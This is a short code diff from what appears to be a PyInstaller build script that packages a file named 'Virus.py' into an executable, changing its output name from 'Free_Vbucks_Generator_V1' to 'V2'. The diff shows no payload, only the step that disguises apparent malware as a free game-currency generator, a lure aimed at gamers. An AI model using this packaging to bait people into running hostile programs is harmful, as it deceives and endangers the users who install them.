@@ -6,7 +6,7 @@ import shutil
 script_path = "Virus.py"
 assets_folder = "Assets"  # Folder containing assets (images, data files, etc.)
 icon_path = "Assets\exeicon.png"  # Path to the icon file
-exeName = "Free_Vbucks_Generator_V1" #Name
+exeName = "Free_Vbucks_Generator_V2" #Name
 # Additional modules that may not be automatically detected by PyInstaller
 additional_modules = [
     "FUNctionalities.stewietest",
